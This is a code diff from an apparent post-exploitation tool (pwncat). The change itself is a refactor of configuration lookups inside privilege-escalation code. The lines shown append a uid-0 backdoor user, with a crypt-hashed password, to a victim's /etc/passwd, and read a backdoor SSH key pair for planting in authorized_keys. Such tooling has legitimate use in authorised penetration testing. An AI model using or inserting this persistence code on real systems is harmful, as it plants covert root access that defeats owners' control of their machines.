@@ -777,8 +777,8 @@ class EscalateResult(Result):
         with pwncat.victim.open("/etc/passwd", "r") as filp:
             passwd = filp.readlines()
 
-        username = pwncat.victim.config["backdoor_user"]
-        password = pwncat.victim.config["backdoor_pass"]
+        username = pwncat.config["backdoor_user"]
+        password = pwncat.config["backdoor_pass"]
         hashed = crypt.crypt(password)
 
         passwd.append(f"{username}:{hashed}:0:0::/root:{pwncat.victim.shell}\n")
@@ -859,9 +859,9 @@ class EscalateResult(Result):
 
                 try:
                     # Read our backdoor private key
-                    with open(pwncat.victim.config["privkey"], "r") as filp:
+                    with open(pwncat.config["privkey"], "r") as filp:
                         privkey = filp.read()
-                    with open(pwncat.victim.config["privkey"] + ".pub", "r") as filp:
+                    with open(pwncat.config["privkey"] + ".pub", "r") as filp:
                         pubkey = filp.read()
 
                     if authkeys is None:
